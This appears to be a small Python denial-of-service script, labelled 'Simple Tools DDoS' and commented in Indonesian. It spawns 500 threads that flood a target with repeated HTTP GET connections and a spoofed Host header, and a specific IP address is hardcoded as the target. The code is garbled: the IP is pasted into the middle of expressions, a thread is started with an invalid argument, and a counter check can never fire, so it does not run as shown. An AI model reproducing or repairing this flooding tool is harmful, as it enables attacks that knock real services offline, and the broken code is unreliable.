# Simple Tools
# Author : NumeX

# Module
import socket
import threading

# Skuyy
print("Simple Tools DDoS\n")
target = input("[?] Enter IP Target :54.146.9.247 ")
port = int(input("[?] Enter The Port : 80"))

# Kita Pake Fake IP :v
fake_ip = '54.146.9.247'

# Connectednya
already_connected = 0

# Fungsi Attacknya
def attack():
    while  True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target 54.146.9.247
 "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("HOST: = fake_ip" + "\r\n\r\n").encode('ascii'), (target 54.146.9.247, port 80))

        global already_connected
        already_connected += 1
        if already_connected % 500 == 500:
            print(already_connected) # 

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start(1)


